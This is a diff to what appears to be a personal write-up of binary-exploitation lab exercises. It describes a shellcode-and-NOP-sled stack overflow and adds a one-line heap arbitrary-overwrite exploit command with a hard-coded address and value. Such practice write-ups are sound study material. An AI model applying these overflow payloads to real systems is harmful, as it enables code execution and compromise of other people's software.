@@ -26,4 +26,8 @@ This was a tedious one.
 - Step 3: The size of the buffer is not show in the code, so I had to use gdb to find the size of the buffer which turned out to be 4068. Fill the buffer with the shellcode and some extra padding to also make sure that the sum of the hex characters in the buffer is divisible by 256. 
 - Step 4: Hold the door open by piping in the shellcode + nopsled with '-' so that the keyboard remains interactive and end of input is not reached. If end of input is reached, shell instantly closes. 
 
-## 
+## Heap Overflow 1
+./heap-arbitrary-overwrite $(perl -e 'printf "A" x 40')$(printf "\x9c\xcf\x0e\x08") $(perl -e 'printf "\x44\x33\x22\x11"')$(perl -e 'printf"B" x 32')
+
+## Heap Overflow 2
+
